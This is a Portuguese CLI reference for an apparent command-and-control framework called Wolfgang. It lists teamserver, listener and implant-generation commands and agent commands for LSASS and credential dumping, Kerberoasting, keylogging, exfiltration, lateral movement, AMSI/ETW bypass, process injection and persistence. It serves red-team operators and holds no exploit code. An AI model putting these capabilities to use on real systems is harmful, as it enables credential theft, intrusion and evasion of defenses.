    Referencia CLI¶

    O client Wolfgang e um REPL interativo que conecta ao teamserver via HTTPS, com WebSocket para eventos em tempo real e TOFU para verificacao de certificado.

    Conectando ao teamserver¶

    Modo interativo (padrao)¶

    ./wolfgang-client

    O client solicita URL, usuario e senha interativamente.

    Modo com flags¶

    ./wolfgang-client connect -s https://10.0.0.1:8443 -u operator1 -p secret
    Flag Descricao
    -s, --server URL do teamserver
    -u, --username Nome do operador
    -p, --password Senha (omitir para prompt seguro)

    Fluxo de conexao¶

    1. Client conecta via HTTPS com InsecureSkipVerify (CA nao e usada)
    2. TOFU verifica o fingerprint SHA-256 do certificado contra ~/.wolfgang/known_servers
    3. Na primeira conexao, o fingerprint e salvo automaticamente
    4. Conexoes seguintes verificam se o fingerprint confere
    5. Client autentica via /api/v1/auth/login e recebe access + refresh tokens
    6. Auto-refresh roda em background, renovando 5 minutos antes da expiracao
    7. WebSocket e estabelecido em /api/v1/ws para eventos em tempo real

    TOFU: Trust On First Use¶

    O arquivo ~/.wolfgang/known_servers armazena fingerprints:

    10.0.0.1 a3f2b1c8d4e5f6...
192.168.1.50 b4c3d2e1f0a9...

    Se o certificado mudar, o client rejeita a conexao com erro de mismatch. Para re-pin, remova a linha correspondente do arquivo.

    Contextos¶

    O REPL opera em dois contextos:

    • Root -- gerenciamento global (listeners, agents, operators, generate)
    • Agent -- operacoes no agent selecionado (shell, upload, creds, evasion)

    O prompt indica o contexto atual:

    wolfgang>>                      # Root
wolfgang [a1b2c3d4]>>          # Agent selecionado

    Comandos Root¶

    Navegacao¶

    Comando Descricao
    help Lista comandos disponiveis
    exit / quit Encerra o client

    Listeners¶

    Comando Descricao
    listeners Lista todos os listeners
    listeners create Cria um novo listener (wizard interativo)
    listeners stop <id> Para um listener por ID

    Saida de listeners:

    ID        TYPE    BIND       PORT  PROFILE        STATUS
a1b2c3d4  https   0.0.0.0    443   google-search  running
b2c3d4e5  dns     0.0.0.0    53                   running

    Agents¶

    Comando Descricao
    agents Lista todos os agents
    use <id> Seleciona um agent (aceita ID parcial)

    O use aceita prefixos -- use a1b2 resolve para o ID completo se for unico. Se ambiguo, retorna erro.

    Saida de agents:

    ID        HOSTNAME    OS       USER      LAST SEEN            TRANSPORT  STATUS
a1b2c3d4  WORKST01    windows  admin     2026-03-14 10:30:00  https      active
b2c3d4e5  srv-linux   linux    root      2026-03-14 10:28:00  dns        dormant

    Operators¶

    Comando Descricao
    operators Lista operadores
    operators create Cria um novo operador (wizard interativo)

    Roles disponiveis: admin, operator, viewer.

    Generate¶

    Comando Descricao
    generate Wizard interativo de geracao de implant

    O wizard solicita OS, arch, transport, callbacks, sleep, jitter, format, garble e dynamic modules. O binario e baixado diretamente do teamserver.

    Modules¶

    Comando Descricao
    modules / modules list Lista modulos armazenados no server
    modules upload <name> <path> Upload de modulo binario
    modules delete <name> Remove modulo

    Plugins¶

    Comando Descricao
    plugins Lista plugins carregados
    plugins reload Recarrega plugins

    Logs¶

    Comando Descricao
    logs [limit] Exibe audit logs (padrao: 20 ultimos)

    Comandos de Agent¶

    Apos selecionar um agent com use <id>:

    Navegacao¶

    Comando Descricao
    back Volta ao contexto root
    info Detalhes do agent selecionado
    tasks Lista tasks do agent

    Execucao¶

    Comando Descricao
    shell Shell interativo (prompt shell>, exit para sair)
    exec <command> Executa um comando unico
    run <module> [json_args] Executa qualquer modulo com args JSON

    Exemplo de shell:

    wolfgang [a1b2c3d4]>> shell
[*] Interactive shell on agent a1b2c3d4 (type 'exit' to return)
shell> whoami
[*] Task queued: f1e2d3c4 (module=shell.exec)
[+] Task completed:
nt authority\system
shell> exit
[*] Shell session closed.

    Operacoes de arquivo¶

    Comando Descricao
    upload <local> <remote> Upload de arquivo para o alvo
    download <remote> <local> Download de arquivo do alvo
    exfil <remote_path> [chunk] [jitter] Exfiltracao chunked
    exfils Lista sessoes de exfiltracao
    exfils download <id> <local> Baixa dados exfiltrados

    Reconhecimento¶

    Comando Descricao
    sysinfo Informacoes do sistema
    osversion Versao detalhada do OS
    screenshot Captura de tela (salva como PNG)
    keylog <start\|stop\|dump> Keylogger

    Credenciais¶

    Comando Descricao
    creds lsass [comsvcs\|minidump\|direct] Dump LSASS
    creds kerberoast Kerberoasting
    creds hive [sam\|security\|system\|all] Dump de registry hives
    creds vault [credman\|browser\|wifi\|all] Credential vaults

    Tecnicas de LSASS:

    • comsvcs -- usa comsvcs.dll MiniDump (padrao)
    • minidump -- MiniDumpWriteDump direto
    • direct -- leitura direta da memoria do processo

    Lateral Movement¶

    Comando Descricao
    rexec <host> <cmd> [--method wmi\|scm] Execucao remota
    pivot <start\|stop\|list> [target:port] Network pivoting
    portfwd <add\|remove> <port> <addr:port> Port forwarding
    socks <start\|stop> [port] SOCKS5 proxy (padrao: 1080)

    Evasion¶

    Comando Descricao
    evasion amsi [hwbp\|patch\|auto] Bypass AMSI
    evasion etw [hwbp\|patch\|auto] Bypass ETW
    evasion unhook Restaurar ntdll do disco
    evasion inject <tech> <pid> <sc_file> Injecao de processo
    evasion memexec <sc_file> Execucao de shellcode em memoria
    evasion stomp <sc_file> [dll] Module stomping
    evasion syscall Resolver numeros de syscall

    Tecnicas de injecao: crt (CreateRemoteThread), earlybird, hollowing.

    Persistencia¶

    Comando Descricao
    persist <method> <exe> [schedule] Instalar persistencia
    cleanup Remover toda persistencia instalada
    selfdestruct Terminar o implant permanentemente

    Metodos de persistencia:

    Metodo Plataforma Descricao
    registry Windows Chave Run no registro
    schtask Windows Scheduled Task
    cron Linux Crontab entry
    launchd macOS Launch Agent

    O selfdestruct pede confirmacao (yes), executa cleanup e termina o implant.

    WebSocket e eventos em tempo real¶

    O client estabelece uma conexao WebSocket em /api/v1/ws para receber notificacoes:

    Evento Descricao
    agent.registered Novo agent conectado
    agent.lost Agent perdeu conexao
    task.completed Task finalizada
    shell.started Sessao shell iniciada por operador
    shell.ended Sessao shell encerrada

    Eventos aparecem acima do prompt com cores ANSI:

    [+] New agent: WORKST01 (windows) -- a1b2c3d4
[+] Task #f1e2d3c4 completed
[!] Agent b2c3d4e5 lost connection

    Se o WebSocket falhar na conexao, o client continua operando normalmente via REST API, apenas sem notificacoes push.

    Historico de comandos¶

    O REPL salva o historico em ~/.wolfgang/history. Navegacao com setas cima/baixo e tab-completion estao disponiveis para todos os comandos.
